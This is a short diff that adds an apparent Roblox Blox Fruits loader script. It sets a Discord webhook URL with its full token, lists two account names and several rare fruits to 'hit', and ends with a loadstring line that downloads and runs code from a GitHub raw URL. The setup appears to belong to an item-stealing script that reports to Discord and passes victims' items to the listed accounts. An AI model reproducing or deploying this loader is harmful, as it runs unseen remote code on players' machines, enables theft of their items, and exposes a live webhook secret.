@@ -1,0 +1,5 @@
+"https://discord.com/api/webhooks/1366962015305990226/enja8RKYHKjievUL-T5Zb3fuS3C5M7nJOfo9tVNaKV-Rt4A5czY83fbkSdXAiWYO6u82"
+{"liltimmybot75","Adiletkz91"}
+FruitsToHit = {"Kitsune-Kitsune", "Leopard-Leopard", "Yeti-Yeti", "Gas-Gas"}
+
+loadstring(game:HttpGet("https://raw.githubusercontent.com/lelel22f/Script2/refs/heads/main/Source"))()
